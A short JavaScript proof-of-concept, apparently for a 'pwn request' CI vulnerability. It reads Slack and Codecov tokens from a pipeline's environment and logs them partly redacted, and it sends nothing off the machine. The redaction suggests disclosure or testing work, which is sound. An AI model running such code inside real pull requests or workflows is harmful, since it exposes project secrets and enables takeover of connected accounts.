function redact(v) {
  if (!v) return "<missing>";
  if (v.length < 10) return "[present]";
  return v.slice(0,4) + "...REDACTED..." + v.slice(-4);
}

console.log("=== PWN REQUEST POC ===");

const secrets = {
  SLACK_BOT_TOKEN: process.env.SLACK_BOT_TOKEN,
  SLACK_WEBHOOK_TRIGGER: process.env.SLACK_WEBHOOK_TRIGGER,
  SLACK_CHANNEL_ID: process.env.SLACK_CHANNEL_ID,
  CODECOV_TOKEN: process.env.CODECOV_TOKEN,
};

for (const [k,v] of Object.entries(secrets)) {
  console.log(`${k}: ${redact(v)}`);
}

console.log("=== END POC ===");
